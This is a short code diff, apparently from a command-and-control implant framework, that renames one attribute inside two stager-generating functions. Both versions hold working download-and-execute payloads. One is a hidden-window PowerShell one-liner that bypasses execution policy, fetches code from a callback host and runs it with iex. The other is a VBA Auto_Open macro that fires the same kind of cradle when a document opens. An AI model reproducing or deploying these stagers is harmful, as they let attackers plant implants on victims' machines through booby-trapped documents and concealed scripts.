@@ -35,7 +35,7 @@ function {{ ron.BasicHttpProfile }}(${{ ron.obf_callback_reason }}){
     def get_powershell_implant_stager(self, implant_data=None):
         stager_string = f"powershell -windowstyle hidden -exec bypass -c " \
                         f"\"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::" \
-                        f"DefaultNetworkCredentials;(iwr 'http://{implant_data['callback_url']}:{implant_data['network_profiles'][self.web_form_id]}" \
+                        f"DefaultNetworkCredentials;(iwr 'http://{implant_data['callback_url']}:{implant_data['network_profiles'][self.profile_tag]}" \
                         f"/robots.txt?user={ implant_data['stager_key']}\' -UseBasicParsing)|iex\""
         return stager_string
 
@@ -43,7 +43,7 @@ function {{ ron.BasicHttpProfile }}(${{ ron.obf_callback_reason }}){
         stager_string = f'''
 Sub Auto_Open()
 Dim exec As String
-exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('http://{implant_data['callback_url']}:{implant_data['network_profiles'][self.web_form_id]}/robots.txt?user={implant_data['stager_key']}'))"""
+exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('http://{implant_data['callback_url']}:{implant_data['network_profiles'][self.profile_tag]}/robots.txt?user={implant_data['stager_key']}'))"""
 Shell (exec)
 End Sub
 :return:'''
